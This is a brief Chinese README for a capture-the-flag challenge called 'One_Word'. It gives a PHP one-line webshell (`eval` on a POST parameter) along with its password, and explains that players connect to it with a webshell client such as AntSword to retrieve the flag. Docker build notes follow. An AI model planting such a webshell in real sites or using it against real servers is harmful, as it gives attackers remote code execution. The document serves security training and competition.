# One_Word
* 题目简介：嘘！连上就有flag，偷偷告诉你连接的密码是` ZSCTF`。

* HINT：源码：
```php
<?php
@eval($_POST['ZSCTF']);
?>`
```
* PS：HINT在比赛进行到一半仍较少人做出该题时放出

* 解法：通过查看提供的密码使用蚁剑或者其他工具连上index.php，下载处于根目录下的flagXXXXX文件，获取flag

* 考点：PHP一句话木马

* 题目搭建：运行`build_docker.sh` 一键搭建。flag为静态，生成后会在根目录下。`entrypoint.sh`脚本会随机修改flag文件的名字，名字为flagXXXXX，请酌情修改脚本。
